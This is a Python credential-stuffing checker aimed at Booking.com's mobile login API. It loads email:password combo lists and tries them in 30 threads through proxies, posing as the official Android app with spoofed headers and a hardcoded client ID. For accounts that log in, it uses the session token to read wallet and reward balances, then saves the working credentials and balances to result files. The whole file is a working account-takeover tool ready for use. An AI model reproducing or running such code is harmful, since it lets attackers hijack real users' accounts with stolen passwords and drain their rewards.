import time
import json
import requests
import uuid
import threading
from colorama import Fore, init, just_fix_windows_console, Style
just_fix_windows_console()
init(autoreset=True)
from tkinter import Tk, filedialog
from queue import Queue

combo_queue = Queue()
total_lines = 0
checked_lines = 0
live_count = 0
die_count = 0

root = Tk()
root.withdraw()
file_path = filedialog.askopenfilename(title="Select combos")
root.destroy()

progress_lock = threading.Lock()

def getRandom():
    return str(uuid.uuid4())

def cekReward(email, password):
    global checked_lines, live_count, die_count
    proxyList = {
        'http': 'http://user:pass@host:port',
        'https': 'http://user:pass@host:port'
    }

    with requests.Session() as s:
        try:

            random_guid = getRandom()

            s.proxies.update(proxyList)

            validJSON = {"action":"STEP_ENTER__EMAIL__SUBMIT","deviceContext":{"aid":337862,"deviceId":random_guid,"deviceType":"DEVICE_TYPE_ANDROID_NATIVE","lang":"en-us","libVersion":"1.1.118","oauthClientId":"eEUpvtgPz7Gv2NSOduzD"},"identifier":{"type":"IDENTIFIER_TYPE__EMAIL","value":email}}
            validConfig = {
                'method': 'post',
                'url': 'https://account.booking.com/api/identity/authenticate/v1.0/enter/email/submit',
                'headers': {
                    'Host': 'account.booking.com',
                    'X-Library': 'okhttp+network-api',
                    # Authorization: 
                    'User-Agent': 'Booking.App/35.2.1 Android/11; Type: mobile; AppStore: google; Brand: Samsung; Model: Galaxy S9;',
                    'Content-Type': 'application/json; charset=UTF-8',
                    'Content-Length': str(len(json.dumps(validJSON))),
                    'Accept-Encoding': 'gzip, deflate, br',
                    'X-Px-Authorization': '1',
                    'Connection': 'keep-alive'
                }
            }

            validResponse = s.post(validConfig['url'], headers=validConfig['headers'], data=json.dumps(validJSON))
            validData = validResponse.json()
            
            if 'nextStep' in validData:
                time.sleep(2)

                nextStep = validData['nextStep']
                if(nextStep == 'STEP_SIGN_IN__PASSWORD'):
                    ctxValue = validData['context']['value']

                    try:

                        validateJSON = {"action":"STEP_SIGN_IN__PASSWORD__SUBMIT","authenticator":{"type":"AUTHENTICATOR_TYPE__PASSWORD","value":password},"context":{"value":ctxValue},"deviceContext":{"aid":337862,"deviceId":random_guid,"deviceType":"DEVICE_TYPE_ANDROID_NATIVE","lang":"en-us","libVersion":"1.1.118","oauthClientId":"eEUpvtgPz7Gv2NSOduzD"}}
                        validateConfig = {
                            'method': 'post',
                            'url': 'https://account.booking.com/api/identity/authenticate/v1.0/sign_in/password/submit',
                            'headers': {
                                'Host': 'account.booking.com',
                                'X-Library': 'okhttp+network-api',
                                # Authorization: 
                                'User-Agent': 'Booking.App/35.2.1 Android/11; Type: mobile; AppStore: google; Brand: Samsung; Model: Galaxy S9;',
                                'Content-Type': 'application/json; charset=UTF-8',
                                'Content-Length': str(len(json.dumps(validateJSON))),
                                'Accept-Encoding': 'gzip, deflate, br',
                                'X-Px-Authorization': '1',
                                'Connection': 'keep-alive'
                            }
                        }

                        validateResponse = s.post(validateConfig['url'], headers=validateConfig['headers'], data=json.dumps(validateJSON))
                        validateData = validateResponse.json()
                        # print(validateData)
                        
                        if 'nextStep' in validateData:
                            nextStep = validateData['nextStep']
                            mobileToken = validateData['payloadAuthenticated']['mobileToken']
                            
                            try:
                                
                                getRewardConfig = {
                                    'method': 'get',
                                    'url': 'https://mobile-apps.booking.com//json/mobile.wallet?page_size=-1&currency_code=USD&txns=0&user_os=11&user_version=35.2.1-android&device_id=ffaaeba1-71f8-4a8f-9e4f-59bd5ae601f3&network_type=wifi&languagecode=en-us&display=normal_xxxhdpi&affiliate_id=337862',
                                    'headers': {
                                        'Host': 'mobile-apps.booking.com',
                                        'X-Booking-Et-Payload': 'H4sIAAAAAAAAAI3Q3QrCMAwF4HfJdQd2s/t7FZES21SLbpW2G+Lou9sJwi4UvEsO4eOQBabZBugX0DRbRdJq6A9gDCKdkBcNN22xx9YUHe1NIbqTFkj1jpsKjonB2eFNRo/qmpHD8t6hBxy1d1ZL44meJKMdSF7cQEHlYJRDAAZrGCIOd+h5U/KurNpG1KVgMONtoqw0ooTEfqHKTWPcqH+RvPomBgrBulHqyWNch03XQOovue44pCMDetzJ5+vc7fOXJaUXVE55TGgBAAA=',
                                        'X-Auth-Token': mobileToken,
                                        'X-Library': 'okhttp+network-api',
                                        'Authorization': 'Basic dGhlc2FpbnRzYnY6ZGdDVnlhcXZCeGdN',
                                        'User-Agent': 'Booking.App/35.2.1 Android/11; Type: mobile; AppStore: google; Brand: Samsung; Model: Galaxy S9;',
                                        'X-Booking-Api-Version': '1',
                                        'Accept-Encoding': 'gzip, deflate, br',
                                        'X-Px-Authorization': '1'
                                    }
                                }

                                getRewardResponse = s.get(getRewardConfig['url'], headers=getRewardConfig['headers'])
                                getRewardData = getRewardResponse.json()

                                RewardAmount = None
                                RewardCurrency = None

                                if getRewardData.get('b_bookingpay_balance'):
                                    RewardAmount = getRewardData['b_bookingpay_balance']['b_total_amount']
                                    RewardCurrency = getRewardData['b_bookingpay_balance']['b_converted_total_currency']
                                    print(f"{Fore.GREEN}[ OK ] {email} | [ {RewardCurrency} {RewardAmount} ] | [ ./{mobileToken} ] ")
                                    with open('ress/resultku.txt', 'a', encoding='utf-8') as f:
                                        f.write(f"{email}:{password} | [ {RewardCurrency} {RewardAmount} ]\n")
                                        with progress_lock:
                                            live_count += 1
                                            
                                else:
                                    print(f"{Fore.YELLOW}[ UNKNOWN ] [ {email} {getRewardData} ] | [ ./{mobileToken}")
                                    with open('ress/result_unk.txt', 'a', encoding='utf-8') as f:
                                        f.write(f"{email}:{password} | [ {getRewardData} ]\n\n")
                                
                                # RewardAmount = getRewardData['b_bookingpay_balance']['b_total_amount']
                                # RewardCurrency = getRewardData['b_bookingpay_balance']['b_converted_total_currency']

                            except Exception as e:
                                print('Get Reward Error: ', e)
                                with open('ress/error.txt', 'a', encoding='utf-8') as f:
                                    f.write(f"{email}:{password}\n")
                        
                        elif 'error' in validateData and validateData['error'][0]['code'] == 'ERROR_CODE__WRONG_PASSWORD':
                            print(f"[ WRONG ] {email}")

                        elif 'error' in validateData and validateData['error'][0]['code'] == 'ERROR_CODE__REQUEST_THROTTLED':
                            print(f"[ THROTTLED ] {email}")

                    except Exception as e:
                        print('Validate JSON Error: ', e)

                elif 'error' in validData and validData['error'][0]['code'] == 'ERROR_CODE__REQUEST_THROTTLED':
                    print(f"[ THROTTLED ] {email}")

                elif nextStep == 'STEP_ACCOUNT__LOCKED':
                    print(f"[ LOCKED ] {email}")

                elif nextStep == 'STEP_EMAIL_MAGIC_LINK_SENT':
                    print(f"[ MAGIC LINK ] {email}")

                else:
                    print(validData)

        finally:
            s.close()
            with progress_lock:
                checked_lines += 1
                if checked_lines % 100 == 0 or checked_lines == total_lines:
                    print(f"[ {Fore.GREEN}{live_count}{Style.RESET_ALL} / {Fore.YELLOW}{checked_lines}{Style.RESET_ALL} | {Fore.GREEN}{total_lines}{Style.RESET_ALL} ]")

def worker():
    while not combo_queue.empty():
        email, password = combo_queue.get()
        try:
            cekReward(email, password)
        finally:
            combo_queue.task_done()

with open(file_path, 'r', encoding='utf-8') as f:
    lines = f.readlines()
    total_lines = len(lines)

    for line in lines:
        parts = line.strip().split(":")
        if len(parts) >= 2:
            email = parts[0].strip()
            password = parts[1].strip()
            combo_queue.put((email, password))
        else:
            print(f"Invalid line format: {line.strip()}")

num_threads = 30
threads = []
for i in range(num_threads):
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

# Wait for all threads to complete
for t in threads:
    t.join()


print(f"{Fore.GREEN} All tasks are completed.")
